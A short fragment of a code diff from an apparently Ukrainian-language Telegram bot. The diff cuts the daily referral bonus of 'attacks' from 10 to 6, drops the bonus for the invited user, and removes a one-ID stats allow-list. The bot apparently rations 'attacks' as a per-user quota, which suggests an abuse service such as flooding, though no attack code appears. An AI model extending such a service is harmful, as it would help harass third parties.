         return can_attack, attacks_left, promo_attacks, referral_attacks
 
@@ -2509,25 +1696,18 @@ async def process_referral(referrer_id, user_id, username, name):
             referrer_id, user_id
         )
         await conn.execute(
-            'UPDATE users SET referral_attacks = referral_attacks + 10, referral_count = referral_count + 1 WHERE user_id = $1',
+            'UPDATE users SET referral_attacks = referral_attacks + 6, referral_count = referral_count + 1 WHERE user_id = $1',
             referrer_id
-        )
-        # +10 атаки запрошеному користувачу на один день
-        await conn.execute(
-            'UPDATE users SET referral_attacks = referral_attacks + 10 WHERE user_id = $1',
-            user_id
         )
         try:
             ref_name = username or name or f"User{user_id}"
             await bot.send_message(
                 referrer_id,
-                f"🎉 За вашою реферальною силкою приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +10 додаткових атак на один день!",
+                f"🎉 За вашою реферальною силкою приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +6 додаткових атак на один день!",
                 parse_mode='HTML'
             )
         except Exception as e:
             logging.error(f"Error notifying referrer {referrer_id}: {e}")
-
-USER_STATS_ALLOWED = [810944378]
 
 if __name__ == '__main__':
     logging.info("Запуск бота...")
